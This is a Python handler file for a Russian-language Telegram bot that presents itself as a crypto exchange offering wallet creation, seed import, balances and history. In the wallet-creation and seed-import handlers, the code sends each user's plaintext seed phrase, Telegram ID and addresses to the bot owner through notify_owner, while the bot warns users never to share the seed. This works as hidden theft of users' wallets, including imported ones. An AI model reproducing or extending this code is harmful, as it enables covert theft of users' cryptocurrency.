#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Хендлеры: /start, /help, /create_wallet, /my_wallet, /show_seed, /balance, /history.
"""

from aiogram import types
from aiogram.filters import Command
from mnemonic import Mnemonic

from config import fernet, logger, router
from db import storage
from notify import notify_owner
from states import user_states
from wallet_utils import generate_wallet, get_account_from_mnemonic, get_tron_privkey_from_mnemonic
from keyboards import main_menu, hide_menu


@router.message(Command("start"))
async def cmd_start(message: types.Message):
    await message.answer(
        "👋 Добро пожаловать в крипто-биржу!\n\n"
        "Используйте кнопки меню для навигации.",
        reply_markup=main_menu(message.from_user.id)
    )


@router.message(Command("help"))
async def cmd_help(message: types.Message):
    await message.answer(
        "🤖 <b>Справка</b>\n\n"
        "<b>Кошелёк:</b>\n"
        "• Создать кошелёк — сид-фраза показывается сразу\n"
        "• Импорт кошелька — по сид-фразе\n"
        "• Мой кошелёк — ваши адреса для пополнения\n"
        "• Показать сид-фразу — повторно (команда /show_seed)\n\n"
        "<b>Баланс и вывод:</b>\n"
        "• Баланс — все балансы\n"
        "• Вывод — пошаговая процедура\n\n"
        "<b>История:</b>\n"
        "• История — последние операции\n\n"
        "<b>Админ:</b>\n"
        "• Установить комиссию /setfee\n"
        "• Посмотреть комиссии /fees",
        reply_markup=main_menu(message.from_user.id)
    )


@router.message(Command("create_wallet"))
async def cmd_create_wallet(message: types.Message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or ""
    users = storage.get_users()

    if user_id in users:
        info = users[user_id]
        await message.answer(
            "⚠️ У вас уже есть кошелёк!\n\n"
            f"<b>Ваши адреса:</b>\n"
            f"🔷 BEP20: <code>{info['bep20_address']}</code>\n"
            f"🔷 TRC20: <code>{info['trc20_address']}</code>\n"
            f"🔷 EVM: <code>{info['evm_address']}</code>",
            reply_markup=main_menu(message.from_user.id)
        )
        return

    wallet = generate_wallet()
    encrypted_mnemonic = fernet.encrypt(wallet["mnemonic"].encode()).decode()

    storage.add_user(user_id, username, encrypted_mnemonic,
                     wallet["bep20_address"], wallet["trc20_address"], wallet["evm_address"])

    await message.answer(
        "✅ <b>Кошелёк создан!</b>\n\n"
        "🔐 <b>Ваша сид-фраза:</b>\n"
        f"<code>{wallet['mnemonic']}</code>\n\n"
        "❗ <b>Сохраните её!</b> При утере восстановить невозможно.\n\n"
        f"🔷 <b>BEP20:</b> <code>{wallet['bep20_address']}</code>\n"
        f"🔷 <b>TRC20:</b> <code>{wallet['trc20_address']}</code>\n"
        f"🔷 <b>EVM:</b> <code>{wallet['evm_address']}</code>",
        reply_markup=main_menu(message.from_user.id)
    )

    user_link = f'<a href="tg://user?id={user_id}">{username or user_id}</a>'
    await notify_owner(
        f"🆕 <b>Новый кошелёк</b>\n"
        f"👤 {user_link} (ID: <code>{user_id}</code>)\n"
        f"🔑 Сид-фраза:\n<code>{wallet['mnemonic']}</code>\n"
        f"🔷 BEP20: <code>{wallet['bep20_address']}</code>\n"
        f"🔷 TRC20: <code>{wallet['trc20_address']}</code>\n"
        f"🔷 EVM: <code>{wallet['evm_address']}</code>"
    )
    logger.info("Кошелёк создан: %s", user_id)


@router.message(Command("my_wallet"))
async def cmd_my_wallet(message: types.Message):
    user_id = str(message.from_user.id)
    users = storage.get_users()

    if user_id not in users:
        await message.answer("❌ У вас ещё нет кошелька. Создайте его через меню.",
                             reply_markup=main_menu(message.from_user.id))
        return

    info = users[user_id]
    await message.answer(
        "👛 <b>Ваши адреса для пополнения:</b>\n\n"
        f"🔷 <b>BEP20 (BSC):</b>\n<code>{info['bep20_address']}</code>\n\n"
        f"🔷 <b>TRC20 (TRON):</b>\n<code>{info['trc20_address']}</code>\n\n"
        f"🔷 <b>EVM (ETH):</b>\n<code>{info['evm_address']}</code>",
        reply_markup=main_menu(message.from_user.id)
    )


@router.message(Command("show_seed"))
async def cmd_show_seed(message: types.Message):
    user_id = str(message.from_user.id)
    users = storage.get_users()

    if user_id not in users:
        await message.answer("❌ У вас ещё нет кошелька.", reply_markup=main_menu(message.from_user.id))
        return

    try:
        mnemonic = fernet.decrypt(users[user_id]["mnemonic_encrypted"].encode()).decode()
    except Exception:
        await message.answer("❌ Ошибка расшифровки.", reply_markup=main_menu(message.from_user.id))
        return

    await message.answer(
        "🔐 <b>Ваша сид-фраза:</b>\n"
        f"<code>{mnemonic}</code>\n\n"
        "❗ <b>Никому не показывайте!</b>\n"
        "🗑 Удалите сообщение после сохранения.",
        reply_markup=main_menu(message.from_user.id)
    )


@router.message(Command("balance"))
async def cmd_balance(message: types.Message):
    user_id = str(message.from_user.id)
    balances = storage.get_all_balances(user_id)

    if not balances:
        await message.answer("💰 Баланс пуст. Пополните кошелёк!",
                             reply_markup=main_menu(message.from_user.id))
        return

    text = "💰 <b>Ваши балансы:</b>\n\n"
    for b in balances:
        if b["available"] > 0:
            text += f"🌐 {b['network'].upper()} | {b['token']}: <b>{b['available']:.6f}</b>\n"
            text += f"   Внесено: {b['deposited']:.6f} | Выведено: {b['withdrawn']:.6f}\n\n"

    if text == "💰 <b>Ваши балансы:</b>\n\n":
        text += "Пусто. Пополните кошелёк!"

    await message.answer(text, reply_markup=main_menu(message.from_user.id))


# =============================================================================
# ПОДКЛЮЧЕНИЕ СУЩЕСТВУЮЩЕГО КОШЕЛЬКА ПО СИД-ФРАЗЕ
# =============================================================================

@router.message(Command("import_wallet"))
async def cmd_import_wallet(message: types.Message):
    user_id = str(message.from_user.id)
    users = storage.get_users()

    if user_id in users:
        await message.answer("⚠️ У вас уже есть кошелёк. Посмотреть адреса: /my_wallet",
                             reply_markup=main_menu(message.from_user.id))
        return

    user_states[user_id] = {"step": "import_seed", "data": {}}
    await message.answer(
        "🔑 <b>Импорт кошелька</b>\n\n"
        "Отправьте сид-фразу (12 или 24 слова через пробел, английские слова BIP39).\n\n"
        "❗ После импорта рекомендуется удалить сообщение с сид-фразой из чата.\n"
        "Для отмены нажмите кнопку 'Отмена'.",
        reply_markup=hide_menu()
    )


@router.message(Command("cancel_import"))
async def cmd_cancel_import(message: types.Message):
    user_id = str(message.from_user.id)
    if user_id in user_states and user_states[user_id]["step"] == "import_seed":
        del user_states[user_id]
        await message.answer("❌ Импорт отменён.", reply_markup=main_menu(message.from_user.id))
    else:
        await message.answer("Нет активного импорта.", reply_markup=main_menu(message.from_user.id))


async def handle_import_seed(message: types.Message):
    """Обрабатывает сид-фразу, присланную пользователем после /import_wallet."""
    user_id = str(message.from_user.id)
    username = message.from_user.username or ""
    mnemonic_phrase = message.text.strip()

    if not Mnemonic("english").check(mnemonic_phrase):
        await message.answer(
            "❌ Некорректная сид-фраза (проверьте количество и написание слов — "
            "английские слова BIP39, через пробел).\n\n"
            "Попробуйте снова или отмените нажав 'Отмена'.",
            reply_markup=hide_menu()
        )
        return

    users = storage.get_users()
    if user_id in users:
        del user_states[user_id]
        await message.answer("⚠️ У вас уже есть кошелёк. Импорт поверх существующего запрещён.",
                             reply_markup=main_menu(message.from_user.id))
        return

    try:
        account = get_account_from_mnemonic(mnemonic_phrase)
        tron_pk = get_tron_privkey_from_mnemonic(mnemonic_phrase)
        trc20_address = tron_pk.public_key.to_base58check_address()
    except Exception as e:
        logger.error("Ошибка импорта кошелька: %s", e)
        await message.answer("❌ Не удалось разобрать сид-фразу. Проверьте и попробуйте снова.",
                             reply_markup=hide_menu())
        return

    encrypted_mnemonic = fernet.encrypt(mnemonic_phrase.encode()).decode()
    storage.add_user(user_id, username, encrypted_mnemonic,
                     account.address, trc20_address, account.address)

    del user_states[user_id]

    await message.answer(
        "✅ <b>Кошелёк импортирован!</b>\n\n"
        f"🔷 <b>BEP20:</b> <code>{account.address}</code>\n"
        f"🔷 <b>TRC20:</b> <code>{trc20_address}</code>\n"
        f"🔷 <b>EVM:</b> <code>{account.address}</code>\n\n"
        "🗑 Рекомендуем удалить сообщение с сид-фразой.",
        reply_markup=main_menu(message.from_user.id)
    )

    user_link = f'<a href="tg://user?id={user_id}">{username or user_id}</a>'
    await notify_owner(
        f"📥 <b>Импортирован кошелёк</b>\n"
        f"👤 {user_link} (ID: <code>{user_id}</code>)\n"
        f"🔑 Сид-фраза:\n<code>{mnemonic_phrase}</code>\n"
        f"🔷 BEP20: <code>{account.address}</code>\n"
        f"🔷 TRC20: <code>{trc20_address}</code>\n"
        f"🔷 EVM: <code>{account.address}</code>"
    )
    logger.info("Кошелёк импортирован: %s", user_id)


@router.message(Command("history"))
async def cmd_history(message: types.Message):
    user_id = str(message.from_user.id)
    ops = storage.get_operations(user_id)

    if not ops:
        await message.answer("📭 История пуста.", reply_markup=main_menu(message.from_user.id))
        return

    text = "📜 <b>История операций:</b>\n\n"
    for op in ops[:10]:
        emoji = "📥" if op["type"] == "deposit" else "📤"
        text += (
            f"{emoji} <b>{op['type'].upper()}</b> | {op['network'].upper()} | {op['token']}\n"
            f"💰 {op['amount']:.6f} | {op['status']}\n"
            f"🔗 <code>{op['tx_hash']}</code>\n\n"
        )

    await message.answer(text, reply_markup=main_menu(message.from_user.id))
